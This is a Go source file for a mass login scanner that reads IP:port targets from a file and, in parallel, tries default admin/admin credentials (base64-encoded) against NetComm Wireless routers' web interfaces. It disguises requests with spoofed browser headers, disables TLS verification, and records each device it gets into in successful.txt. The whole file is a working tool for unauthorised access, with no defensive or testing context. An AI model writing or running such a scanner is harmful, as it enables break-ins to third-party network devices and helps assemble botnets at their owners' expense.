package main

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

func main() {
	// Read IP:port combinations from ips.txt
	ipPorts, err := readIPPortsFromFile("ips.txt")
	if err != nil {
		fmt.Println("Error reading IP:port combinations from file:", err)
		return
	}

	for _, ipPort := range ipPorts {
		go func(ipPort string) {
			err := checkAndLogLogin(ipPort)
			if err != nil {
				fmt.Println("Error:", err)
			}
		}(ipPort)
	}

	// Sleep to allow time for requests to finish
	time.Sleep(15 * time.Second)
}

func checkAndLogLogin(ipPort string) error {
	url := fmt.Sprintf("http://%s/summary.html", ipPort)
	payload := []byte("loginID=YWRtaW4%3D&loginPWD=YWRtaW4%3D")

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: transport,
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer(payload))
	if err != nil {
		return err
	}

	req.Header.Set("Host", ipPort)
	req.Header.Set("Content-Length", "38")
	req.Header.Set("Cache-Control", "max-age=0")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Origin", "http://"+ipPort)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Referer", "http://"+ipPort+"/login.html")
	req.Header.Set("Accept-Encoding", "gzip, deflate")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Connection", "close")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Read the response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return err
	}

	// Check if the response body contains the specified title
	if strings.Contains(string(body), "<title>NetComm Wireless Limited</title>") {
		// Log successful IP:port to successful.txt
		if err := logSuccessfulIP(ipPort); err != nil {
			return err
		}
		fmt.Println("[NETCOMM] successfully logged into:", ipPort)
	} else {
		fmt.Println("[NETCOMM] login failed for:", ipPort)
	}

	return nil
}

func readIPPortsFromFile(filename string) ([]string, error) {
	content, err := ioutil.ReadFile(filename)
	if err != nil {
		return nil, err
	}
	ipPortLines := strings.Split(string(content), "\n")
	var ipPorts []string
	for _, line := range ipPortLines {
		ipPort := strings.TrimSpace(line)
		if ipPort != "" {
			ipPorts = append(ipPorts, ipPort)
		}
	}
	return ipPorts, nil
}

func logSuccessfulIP(ipPort string) error {
	file, err := os.OpenFile("successful.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = file.WriteString(ipPort + "\n")
	return err
}
